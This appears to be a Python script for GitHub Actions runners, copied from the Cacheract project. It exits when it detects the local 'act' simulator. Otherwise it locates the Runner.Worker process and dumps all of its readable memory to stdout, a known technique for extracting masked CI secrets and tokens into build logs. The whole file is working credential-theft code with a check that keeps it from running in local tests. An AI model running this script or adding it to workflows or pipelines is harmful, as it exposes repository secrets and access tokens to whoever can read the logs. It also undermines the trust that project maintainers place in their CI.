import os
import sys

# Simulate act environment
if os.environ.get("IS_RUNNING_IN_ACT") == "true":
    sys.exit(0)

# From here copied from https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py

import sys
import os
import re

# Credit to github.com/nikitastupin for the script.

def get_pid():
    pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]

    for pid in pids:
        with open(os.path.join('/proc', pid, 'cmdline'), 'rb') as cmdline_f:
            if b'Runner.Worker' in cmdline_f.read():
                return pid

    raise Exception('Can not get pid of Runner.Worker')

pid = get_pid()

map_path = f"/proc/{pid}/maps"
mem_path = f"/proc/{pid}/mem"

with open(map_path, 'r') as map_f, open(mem_path, 'rb', 0) as mem_f:
    for line in map_f.readlines():  # for each mapped region
        m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
        if m.group(3) == 'r':  # readable region
            start = int(m.group(1), 16)
            end = int(m.group(2), 16)
            if start > sys.maxsize:
                continue
            mem_f.seek(start)  # seek to region start
        
            try:
                chunk = mem_f.read(end - start)  # read region contents
                sys.stdout.buffer.write(chunk)
            except OSError:
                continue